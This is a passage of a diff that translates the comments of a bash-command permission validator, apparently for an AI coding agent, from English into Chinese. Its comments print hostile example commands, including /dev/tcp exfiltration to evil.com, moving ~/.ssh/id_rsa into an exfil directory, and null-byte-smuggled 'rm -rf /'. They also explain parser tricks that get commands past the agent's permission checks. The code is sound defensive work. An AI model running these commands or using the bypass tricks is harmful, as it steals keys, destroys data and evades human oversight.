+ * bash 中：`#` 开始注释，`rm -rf /` 在第 2 行执行。
+ * extractQuotedContent 中：位置 14（# 后）的 `'` 开启单
+ * 引号，MARKER 前的 `'` 关闭它。但 MARKER 后的 `'` 开启
+ * 另一个单引号，吞掉换行和 `rm -rf /`，所以
+ * validateNewlines 看不到未引用换行。
  *
- * Defense: If we see an unquoted `#` followed by any quote character on the
- * same line, treat it as a misparsing concern. Legitimate commands rarely
- * have quote characters in their comments (and if they do, the user can
- * approve manually).
+ * 防御：如果看到未引用 `#` 后跟任何引号字符（同一行），
+ * 视为误解析问题。合法命令极少在注释中有
+ * 引号字符（如果有，用户可手动批准）。
  */
 function validateCommentQuoteDesync(
   context: ValidationContext,
 ): PermissionResult {
-  // Tree-sitter path: tree-sitter correctly identifies comment nodes and
-  // quoted content. The desync concern is about regex quote tracking being
-  // confused by quote characters inside comments. When tree-sitter provides
-  // the quote context, this desync cannot happen — the AST is authoritative
-  // regardless of whether the command contains a comment.
+  // Tree-sitter 路径：tree-sitter 正确识别注释节点和
+  // 引号内容。失步问题是关于 regex 引号跟踪被
+  // 注释内的引号字符混淆。当 tree-sitter 提供
+  // 引号上下文时，此失步不会发生 —— 无论命令是否含注释，
+  // AST 都是权威的。
   if (context.treeSitter) {
     return {
       behavior: 'passthrough',
@@ -2004,10 +1991,10 @@ function validateCommentQuoteDesync(
 
   const { originalCommand } = context
 
-  // Track quote state character-by-character using the same (correct) logic
-  // as extractQuotedContent: single quotes don't toggle inside double quotes.
-  // When we encounter an unquoted `#`, check if the rest of the line (until
-  // newline) contains any quote characters.
+  // 使用与 extractQuotedContent 相同的（正确）逻辑逐字符跟踪引号状态：
+  // 单引号在双引号内不切换。
+  // 遇到未引用 `#` 时，检查该行剩余部分（到
+  // 换行）是否含任何引号字符。
   let inSingleQuote = false
   let inDoubleQuote = false
   let escaped = false
@@ -2032,7 +2019,7 @@ function validateCommentQuoteDesync(
 
     if (inDoubleQuote) {
       if (char === '"') inDoubleQuote = false
-      // Single quotes inside double quotes are literal — no toggle
+      // 双引号内的单引号是字面值 —— 不切换
       continue
     }
 
@@ -2046,8 +2033,8 @@ function validateCommentQuoteDesync(
       continue
     }
 
-    // Unquoted `#` — in bash, this starts a comment. Check if the rest of
-    // the line contains quote characters that would desync other trackers.
+    // 未引用 `#` —— bash 中，这开始注释。检查该行剩余
+    // 是否含会使其他跟踪器失步的引号字符。
     if (char === '#') {
       const lineEnd = originalCommand.indexOf('\n', i)
       const commentText = originalCommand.slice(
@@ -2064,9 +2051,9 @@ function validateCommentQuoteDesync(
             'Command contains quote characters inside a # comment which can desync quote tracking',
         }
       }
-      // Skip to end of line (rest is comment)
+      // 跳到行尾（剩余是注释）
       if (lineEnd === -1) break
-      i = lineEnd // Loop increment will move past newline
+      i = lineEnd // 循环递增将移过换行
     }
   }
 
@@ -2074,54 +2061,53 @@ function validateCommentQuoteDesync(
 }
 
 /**
- * Detects a newline inside a quoted string where the NEXT line would be
- * stripped by stripCommentLines (trimmed line starts with `#`).
+ * 检测引号字符串内的换行，且下一行会被
+ * stripCommentLines 剥离（trimmed 行以 `#` 开头）的情况。
  *
- * In bash, `\n` inside quotes is a literal character and part of the argument.
- * But stripCommentLines (called by stripSafeWrappers in bashPermissions before
- * path validation and rule matching) processes commands LINE-BY-LINE via
- * `command.split('\n')` without tracking quote state. A quoted newline lets an
- * attacker position the next line to start with `#` (after trim), causing
- * stripCommentLines to drop that line entirely — hiding sensitive paths or
- * arguments from path validation and permission rule matching.
+ * bash 中，引号内的 `\n` 是字面字符和参数的一部分。
+ * 但 stripCommentLines（由 stripSafeWrappers 在 bashPermissions 中
+ * 路径校验和规则匹配前调用）通过
+ * `command.split('\n')` 逐行处理命令，不跟踪引号状态。引号换行让
+ * 攻击者能把下一行定位为（trim 后）以 `#` 开头，导致
+ * stripCommentLines 完全丢弃该行 —— 从路径校验和权限规则匹配中
+ * 隐藏敏感路径或参数。
  *
- * Example attack (auto-allowed in acceptEdits mode without any Bash rules):
+ * 攻击示例（在 acceptEdits 模式下无任何 Bash 规则时自动允许）：
  *   mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir
- * Bash: moves ./decoy AND ~/.ssh/id_rsa into ./exfil_dir/ (errors on `\n#`).
- * stripSafeWrappers: line 2 starts with `#` → stripped → "mv ./decoy '".
- * shell-quote: drops unbalanced trailing quote → ["mv", "./decoy"].
- * checkPathConstraints: only sees ./decoy (in cwd) → passthrough.
- * acceptEdits mode: mv with all-cwd paths → ALLOW. Zero clicks, no warning.
+ * bash：把 ./decoy 和 ~/.ssh/id_rsa 移入 ./exfil_dir/（对 `\n#` 报错）。
+ * stripSafeWrappers：第 2 行以 `#` 开头 → 剥离 → "mv ./decoy '"。
+ * shell-quote：丢弃不平衡的尾随引号 → ["mv", "./decoy"]。
+ * checkPathConstraints：只看到 ./decoy（在 cwd 中）→ passthrough。
+ * acceptEdits 模式：带全 cwd 路径的 mv → 允许。零点击，无警告。
  *
- * Also works with cp (exfil), rm/rm -rf (delete arbitrary files/dirs).
+ * 也适用于 cp（外泄）、rm/rm -rf（删除任意文件/目录）。
  *
- * Defense: block ONLY the specific stripCommentLines trigger — a newline inside
- * quotes where the next line starts with `#` after trim. This is the minimal
- * check that catches the parser differential while preserving legitimate
- * multi-line quoted arguments (echo 'line1\nline2', grep patterns, etc.).
- * Safe heredocs ($(cat <<'EOF'...)) and git commit -m "..." are handled by
- * early validators and never reach this check.
+ * 防御：只屏蔽特定的 stripCommentLines 触发 —— 引号内换行
+ * 且下一行 trim 后以 `#` 开头。这是捕获解析器差异的最小
+ * 检查，同时保留合法多行引号参数（echo 'line1\nline2'、grep 模式等）。
+ * 安全 heredoc（$(cat <<'EOF'...)）和 git commit -m "..." 由
+ * 早期验证器处理，从不到达此检查。
  *
- * This validator is NOT in nonMisparsingValidators — its ask result gets
- * isBashSecurityCheckForMisparsing: true, causing an early block in the
- * permission flow at bashPermissions.ts before any line-based processing runs.
+ * 此验证器不在 nonMisparsingValidators 中 —— 其 ask 结果会获得
+ * isBashSecurityCheckForMisparsing: true，在权限流程
+ * bashPermissions.ts 中任何基于行的处理运行前导致提前阻止。
  */
 function validateQuotedNewline(context: ValidationContext): PermissionResult {
   const { originalCommand } = context
 
-  // Fast path: must have both a newline byte AND a # character somewhere.
-  // stripCommentLines only strips lines where trim().startsWith('#'), so
-  // no # means no possible trigger.
+  // 快速路径：必须同时有换行字节和某处的 # 字符。
+  // stripCommentLines 只剥离 trim().startsWith('#') 的行，所以
+  // 无 # 意味着无可能触发。
   if (!originalCommand.includes('\n') || !originalCommand.includes('#')) {
     return { behavior: 'passthrough', message: 'No newline or no hash' }
   }
 
-  // Track quote state. Mirrors extractQuotedContent / validateCommentQuoteDesync:
-  // - single quotes don't toggle inside double quotes
-  // - backslash escapes the next char (but not inside single quotes)
-  // stripCommentLines splits on '\n' (not \r), so we only treat \n as a line
-  // separator. \r inside a line is removed by trim() and doesn't change the
-  // trimmed-starts-with-# check.
+  // 跟踪引号状态。镜像 extractQuotedContent / validateCommentQuoteDesync：
+  // - 单引号在双引号内不切换
+  // - 反斜杠转义下一字符（单引号内不转义）
+  // stripCommentLines 以 '\n' 分割（非 \r），所以我们只把 \n 当作行
+  // 分隔符。行内 \r 由 trim() 移除，不改变
+  // trimmed-starts-with-# 检查。
   let inSingleQuote = false
   let inDoubleQuote = false
   let escaped = false
@@ -2149,10 +2135,10 @@ function validateQuotedNewline(context: ValidationContext): PermissionResult {
       continue
     }
 
-    // A newline inside quotes: the NEXT line (from bash's perspective) starts
-    // inside a quoted string. Check if that line would be stripped by
-    // stripCommentLines — i.e., after trim(), does it start with `#`?
-    // This exactly mirrors: lines.filter(l => !l.trim().startsWith('#'))
+    // 引号内换行：下一行（bash 视角）开始于
+    // 引号字符串内。检查该行是否会被
+    // stripCommentLines 剥离 —— 即 trim() 后是否以 `#` 开头？
+    // 这精确镜像：lines.filter(l => !l.trim().startsWith('#'))
     if (char === '\n' && (inSingleQuote || inDoubleQuote)) {
       const lineStart = i + 1
       const nextNewline = originalCommand.indexOf('\n', lineStart)
@@ -2175,22 +2161,21 @@ function validateQuotedNewline(context: ValidationContext): PermissionResult {
 }
 
 /**
- * Validates that the command doesn't use Zsh-specific dangerous commands that
- * can bypass security checks. These commands provide capabilities like loading
- * kernel modules, raw file I/O, network access, and pseudo-terminal execution
- * that circumvent normal permission checks.
+ * 校验命令不使用可绕过安全检查的 Zsh 特有危险命令。
+ * 这些命令提供加载内核模块、原始文件 I/O、网络访问和伪终端执行等
+ * 能力，绕过正常权限检查。
  *
- * Also catches `fc -e` which can execute arbitrary editors on command history,
- * and `emulate` which with `-c` is an eval-equivalent.
+ * 也捕获 `fc -e`（可在命令历史上执行任意编辑器），
+ * 以及带 `-c` 的 `emulate`（等价于 eval）。
  */
 function validateZshDangerousCommands(
   context: ValidationContext,
 ): PermissionResult {
   const { originalCommand } = context
 
-  // Extract the base command from the original command, stripping leading
-  // whitespace, env var assignments, and Zsh precommand modifiers.
-  // e.g., "FOO=bar command builtin zmodload" -> "zmodload"
+  // 从原始命令提取基础命令，剥离前导
+  // 空白、环境变量赋值和 Zsh precommand 修饰符。
+  // 例如 "FOO=bar command builtin zmodload" -> "zmodload"
   const ZSH_PRECOMMAND_MODIFIERS = new Set([
     'command',
     'builtin',
@@ -2201,9 +2186,9 @@ function validateZshDangerousCommands(
   const tokens = trimmed.split(/\s+/)
   let baseCmd = ''
   for (const token of tokens) {
-    // Skip env var assignments (VAR=value)
+    // 跳过环境变量赋值（VAR=value）
     if (/^[A-Za-z_]\w*=/.test(token)) continue
-    // Skip Zsh precommand modifiers (they don't change what command runs)
+    // 跳过 Zsh precommand 修饰符（它们不改变运行的命令）
     if (ZSH_PRECOMMAND_MODIFIERS.has(token)) continue
     baseCmd = token
     break
@@ -2220,9 +2205,9 @@ function validateZshDangerousCommands(
     }
   }
 
-  // Check for `fc -e` which allows executing arbitrary commands via editor
-  // fc without -e is safe (just lists history), but -e specifies an editor
-  // to run on the command, effectively an eval
+  // 检查 `fc -e`，它允许通过编辑器执行任意命令
+  // 无 -e 的 fc 是安全的（只列出历史），但 -e 指定编辑器
+  // 对命令运行，实际上是 eval
   if (baseCmd === 'fc' && /\s-\S*e/.test(trimmed)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
@@ -2242,27 +2227,27 @@ function validateZshDangerousCommands(
 }
 
 /**
- * Detects usage of Bash's network pseudo-device paths /dev/tcp/ and /dev/udp/.
+ * 检测 Bash 网络 pseudo-device 路径 /dev/tcp/ 和 /dev/udp/ 的使用。
  *
- * SECURITY: Bash interprets /dev/tcp/host/port and /dev/udp/host/port as
- * network connections when used in redirects or as arguments to commands
- * like cat. This allows data exfiltration without any network tools:
+ * 安全性：Bash 将 /dev/tcp/host/port 和 /dev/udp/host/port 解释为
+ * 网络连接（当用于 redirect 或作为 cat 等命令的参数时）。这允许
+ * 无需任何网络工具即可数据外泄：
  *
  *   echo "secrets" > /dev/tcp/evil.com/4444
  *   cat < /dev/tcp/evil.com/8080
  *   exec 3<>/dev/udp/evil.com/53
  *   cat /dev/tcp/attacker.com/8080
  *
- * These paths are NOT real filesystem entries — they are intercepted by Bash
- * itself. Normal path validation (validatePath) cannot catch them because
- * the files don't exist on disk.
+ * 这些路径不是真实文件系统条目 —— 由 Bash
+ * 自身拦截。正常路径校验（validatePath）无法捕获它们，因为
+ * 文件在磁盘上不存在。
  */
 const NETWORK_DEVICE_PATH_RE = /\/dev\/(tcp|udp)\/[^/\s"'`$]+\/\d+/i
 
 function validateNetworkDeviceRedirect(
   context: ValidationContext,
 ): PermissionResult {
-  // Check in fullyUnquotedContent to catch quoted variants like "/dev/tcp/..."
+  // 在 fullyUnquotedContent 中检查以捕获引用变体如 "/dev/tcp/..."
   if (NETWORK_DEVICE_PATH_RE.test(context.fullyUnquotedContent)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.NETWORK_DEVICE_REDIRECT,
@@ -2280,26 +2265,25 @@ function validateNetworkDeviceRedirect(
   }
 }
 
-// Matches non-printable control characters that have no legitimate use in shell
-// commands: 0x00-0x08, 0x0B-0x0C, 0x0E-0x1F, 0x7F. Excludes tab (0x09),
-// newline (0x0A), and carriage return (0x0D) which are handled by other
-// validators. Bash silently drops null bytes and ignores most control chars,
-// so an attacker can use them to slip metacharacters past our checks while
-// bash still executes them (e.g., "echo safe\x00; rm -rf /").
+// 匹配在 shell 命令中无合法用途的不可打印控制字符：
+// 0x00-0x08、0x0B-0x0C、0x0E-0x1F、0x7F。排除制表符（0x09）、
+// 换行（0x0A）和回车（0x0D），它们由其他验证器处理。Bash 静默丢弃
+// null 字节并忽略大多数控制字符，所以攻击者可用它们让元字符
+// 溜过我们的检查，而 bash 仍执行它们（例如 "echo safe\x00; rm -rf /"）。
 // eslint-disable-next-line no-control-regex
 // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional control character matching for security validation
 const CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/
 
 /**
- * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
- * unavailable. The primary gate is parseForSecurity (ast.ts).
+ * @deprecated 遗留 regex/shell-quote 路径。只在 tree-sitter 不可用时使用。
+ * 主 gate 是 parseForSecurity（ast.ts）。
  */
 export function bashCommandIsSafe_DEPRECATED(
   command: string,
 ): PermissionResult {
-  // SECURITY: Block control characters before any other processing. Null bytes
-  // and other non-printable chars are silently dropped by bash but confuse our
-  // validators, allowing metacharacters adjacent to them to slip through.
+  // 安全性：在任何其他处理前屏蔽控制字符。null 字节
+  // 和其他不可打印字符被 bash 静默丢弃，但会混淆我们的
+  // 验证器，使相邻的元字符溜过。
   if (CONTROL_CHAR_RE.test(command)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
@@ -2312,8 +2296,8 @@ export function bashCommandIsSafe_DEPRECATED(
     }
   }
 
-  // SECURITY: Detect '\' patterns that exploit shell-quote's incorrect handling
-  // of backslashes inside single quotes. Must run before shell-quote parsing.
+  // 安全性：检测利用 shell-quote 对单引号内反斜杠错误处理的
+  // '\' 模式。必须在 shell-quote 解析前运行。
   if (hasShellQuoteSingleQuoteBug(command)) {
     return {
       behavior: 'ask',
@@ -2323,13 +2307,13 @@ export function bashCommandIsSafe_DEPRECATED(
     }
   }
 
-  // SECURITY: Strip heredoc bodies before running security validators.
-  // Only strip bodies for quoted/escaped delimiters (<<'EOF', <<\EOF) where
-  // the body is literal text — $(), backticks, and ${} are NOT expanded.
-  // Unquoted heredocs (<<EOF) undergo full shell expansion, so their bodies
-  // may contain executable command substitutions that validators must see.
-  // When extractHeredocs bails out (can't parse safely), the raw command
-  // goes through all validators — which is the safe direction.
+  // 安全性：在运行安全验证器前剥离 heredoc body。
+  // 只剥离带引号/转义分隔符（<<'EOF'、<<\EOF）的 body，其中
+  // body 是字面文本 —— $()、反引号和 ${} 不展开。
+  // 未引用的 heredoc（<<EOF）会经历完整 shell 展开，所以其 body
+  // 可能包含验证器必须看到的可执行命令替换。
+  // 当 extractHeredocs 退出（无法安全解析）时，原始命令
+  // 会经过所有验证器 —— 这是安全方向。
   const { processedCommand } = extractHeredocs(command, { quotedOnly: true })
 
   const baseCommand = command.split(' ')[0] || ''
@@ -2371,15 +2355,15 @@ export function bashCommandIsSafe_DEPRECATED(
     }
   }
 
-  // Validators that don't set isBashSecurityCheckForMisparsing — their ask
-  // results go through the standard permission flow rather than being blocked
-  // early. LF newlines and redirections are normal patterns that splitCommand
-  // handles correctly, not misparsing concerns.
+  // 不设置 isBashSecurityCheckForMisparsing 的验证器 —— 其 ask
+  // 结果走标准权限流程，而非提前阻止。
+  // LF 换行和 redirection 是 splitCommand 正确处理的正常模式，
+  // 不是误解析问题。
   //
-  // NOTE: validateCarriageReturn is NOT here — CR IS a misparsing concern.
-  // shell-quote's `[^\s]` treats CR as a word separator (JS `\s` ⊃ \r), but
-  // bash IFS does NOT include CR. splitCommand collapses CR→space, which IS
-  // misparsing. See validateCarriageReturn for the full attack trace.
+  // 注意：validateCarriageReturn 不在此 —— CR 是误解析问题。
+  // shell-quote 的 `[^\s]` 把 CR 视为词分隔符（JS `\s` ⊃ \r），但
+  // bash IFS 不包含 CR。splitCommand 将 CR 折叠为空格，这才是
+  // 误解析。完整攻击轨迹见 validateCarriageReturn。
   const nonMisparsingValidators = new Set([
     validateNewlines,
     validateRedirections,
@@ -2390,16 +2374,16 @@ export function bashCommandIsSafe_DEPRECATED(
     validateObfuscatedFlags,
     validateShellMetacharacters,
     validateDangerousVariables,
-    // Run comment-quote-desync BEFORE validateNewlines: it detects cases where
-    // the quote tracker would miss newlines due to # comment desync.
+    // 在 validateNewlines 前运行 comment-quote-desync：它检测
+    // 引号跟踪器因 # 注释失步而遗漏换行的情况。
     validateCommentQuoteDesync,
-    // Run quoted-newline BEFORE validateNewlines: it detects the INVERSE case
-    // (newlines INSIDE quotes, which validateNewlines ignores by design). Quoted
-    // newlines let attackers split commands across lines so that line-based
-    // processing (stripCommentLines) drops sensitive content.
+    // 在 validateNewlines 前运行 quoted-newline：它检测反向情况
+    // （引号内换行，validateNewlines 设计上忽略）。引号
+    // 换行让攻击者跨行分割命令，使基于行的
+    // 处理（stripCommentLines）丢弃敏感内容。
     validateQuotedNewline,
-    // CR check runs BEFORE validateNewlines — CR is a MISPARSING concern
-    // (shell-quote/bash tokenization differential), LF is not.
+    // CR 检查在 validateNewlines 前运行 —— CR 是误解析问题
+    // （shell-quote/bash 分词差异），LF 不是。
     validateCarriageReturn,
     validateNewlines,
     validateIFSInjection,
@@ -2413,23 +2397,23 @@ export function bashCommandIsSafe_DEPRECATED(
     validateBraceExpansion,
     validateZshDangerousCommands,
     validateNetworkDeviceRedirect,
-    // Run malformed token check last - other validators should catch specific patterns first
-    // (e.g., $() substitution, backticks, etc.) since they have more precise error messages
+    // 最后运行畸形 token 检查 —— 其他验证器应先捕获特定模式
+    // （例如 $() 替换、反引号等），因为它们有更精确的错误消息
     validateMalformedTokenInjection,
   ]
 
-  // SECURITY: We must NOT short-circuit when a non-misparsing validator
-  // returns 'ask' if there are still misparsing validators later in the list.
-  // Non-misparsing ask results are discarded at bashPermissions.ts:~1301-1303
-  // (the gate only blocks when isBashSecurityCheckForMisparsing is set). If
-  // validateRedirections (index 10, non-misparsing) fires first on `>`, it
-  // returns ask-without-flag — but validateBackslashEscapedOperators (index 12,
-  // misparsing) would have caught `\;` WITH the flag. Short-circuiting lets a
-  // payload like `cat safe.txt \; echo /etc/passwd > ./out` slip through.
+  // 安全性：当 non-misparsing 验证器返回 'ask' 时，如果列表中
+  // 后面还有 misparsing 验证器，我们绝不能短路。
+  // Non-misparsing ask 结果在 bashPermissions.ts:~1301-1303 被丢弃
+  // （gate 只在 isBashSecurityCheckForMisparsing 设置时阻止）。如果
+  // validateRedirections（索引 10，non-misparsing）先对 `>` 触发，它
+  // 返回不带 flag 的 ask —— 但 validateBackslashEscapedOperators（索引 12，
+  // misparsing）会带 flag 捕获 `\;`。短路会让
+  // 类似 `cat safe.txt \; echo /etc/passwd > ./out` 的 payload 溜过。
   //
-  // Fix: defer non-misparsing ask results. Continue running validators; if any
-  // misparsing validator fires, return THAT (with the flag). Only if we reach
-  // the end without a misparsing ask, return the deferred non-misparsing ask.
+  // 修复：延迟 non-misparsing ask 结果。继续运行验证器；如果任何
+  // misparsing 验证器触发，返回那个（带 flag）。只有到达
+  // 末尾而无 misparsing ask 时，才返回延迟的 non-misparsing ask。
   let deferredNonMisparsingResult: PermissionResult | null = null
   for (const validator of validators) {
     const result = validator(context)
@@ -2454,32 +2438,31 @@ export function bashCommandIsSafe_DEPRECATED(
 }
 
 /**
- * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
- * unavailable. The primary gate is parseForSecurity (ast.ts).
+ * @deprecated 遗留 regex/shell-quote 路径。只在 tree-sitter 不可用时使用。
+ * 主 gate 是 parseForSecurity（ast.ts）。
  *
- * Async version of bashCommandIsSafe that uses tree-sitter when available
- * for more accurate parsing. Falls back to the sync regex version when
- * tree-sitter is not available.
+ * bashCommandIsSafe 的异步版本，在可用时使用 tree-sitter
+ * 进行更精确解析。tree-sitter 不可用时回退到同步 regex 版本。
  *
- * This should be used by async callers (bashPermissions.ts, bashCommandHelpers.ts).
- * Sync callers (readOnlyValidation.ts) should continue using bashCommandIsSafe().
+ * 异步调用方（bashPermissions.ts、bashCommandHelpers.ts）应使用此版本。
+ * 同步调用方（readOnlyValidation.ts）应继续使用 bashCommandIsSafe()。
  */
 export async function bashCommandIsSafeAsync_DEPRECATED(
   command: string,
   onDivergence?: () => void,
 ): Promise<PermissionResult> {
-  // Try to get tree-sitter analysis
+  // 尝试获取 tree-sitter 分析
   const parsed = await ParsedCommand.parse(command)
   const tsAnalysis = parsed?.getTreeSitterAnalysis() ?? null
 
-  // If no tree-sitter, fall back to sync version
+  // 如果无 tree-sitter，回退到同步版本
   if (!tsAnalysis) {
     return bashCommandIsSafe_DEPRECATED(command)
   }
 
-  // Run the same security checks but with tree-sitter enriched context.
-  // The early checks (control chars, shell-quote bug) don't benefit from
-  // tree-sitter, so we run them identically.
+  // 运行相同安全检查，但使用 tree-sitter 丰富的上下文。
+  // 早期检查（控制字符、shell-quote bug）不从
+  // tree-sitter 受益，所以我们相同运行。
   if (CONTROL_CHAR_RE.test(command)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
@@ -2505,15 +2488,15 @@ export async function bashCommandIsSafeAsync_DEPRECATED(
 
   const baseCommand = command.split(' ')[0] || ''
 
-  // Use tree-sitter quote context for more accurate analysis
+  // 使用 tree-sitter 引号上下文进行更精确分析
   const tsQuote = tsAnalysis.quoteContext
   const regexQuote = extractQuotedContent(
     processedCommand,
     baseCommand === 'jq',
   )
 
-  // Use tree-sitter quote context as primary, but keep regex as reference
-  // for divergence logging
+  // 使用 tree-sitter 引号上下文作为主要，但保留 regex 作为参考
+  // 用于差异日志
   const withDoubleQuotes = tsQuote.withDoubleQuotes
   const fullyUnquoted = tsQuote.fullyUnquoted
   const unquotedKeepQuoteChars = tsQuote.unquotedKeepQuoteChars
@@ -2528,19 +2511,19 @@ export async function bashCommandIsSafeAsync_DEPRECATED(
     treeSitter: tsAnalysis,
   }
 
-  // Log divergence between tree-sitter and regex quote extraction.
-  // Skip for heredoc commands: tree-sitter strips (quoted) heredoc bodies
-  // to nothing while the regex path replaces them with placeholder strings
-  // (via extractHeredocs), so the two outputs can never match. Logging
-  // divergence for every heredoc command would poison the signal.
+  // 记录 tree-sitter 与 regex 引号提取之间的差异。
+  // 对 heredoc 命令跳过：tree-sitter 将（引号）heredoc body 剥离
+  // 为空，而 regex 路径用占位字符串替换它们
+  // （通过 extractHeredocs），所以两个输出永远不匹配。对每个
+  // heredoc 命令记录差异会污染信号。
   //
-  // onDivergence callback: when called in a fanout loop (bashPermissions.ts
-  // Promise.all over subcommands), the caller batches divergences into a
-  // single logEvent instead of N separate calls. Each logEvent triggers
+  // onDivergence 回调：在 fanout 循环（bashPermissions.ts
+  // 对 subcommands 的 Promise.all）中调用时，调用方将差异批处理为
+  // 单个 logEvent 而非 N 个独立调用。每个 logEvent 触发
   // getEventMetadata() → buildProcessMetrics() → process.memoryUsage() →
-  // /proc/self/stat read; with memoized metadata these resolve as microtasks
-  // and starve the event loop (CC-643). Single-command callers omit the
-  // callback and get the original per-call logEvent behavior.
+  // /proc/self/stat 读取；使用 memoized 元数据时这些解析为 microtask
+  // 并饿死事件循环（CC-643）。单命令调用方省略
+  // 回调并获得原始的每次调用 logEvent 行为。
   if (!tsAnalysis.dangerousPatterns.hasHeredoc) {
     const hasDivergence =
       tsQuote.fullyUnquoted !== regexQuote.fullyUnquoted ||
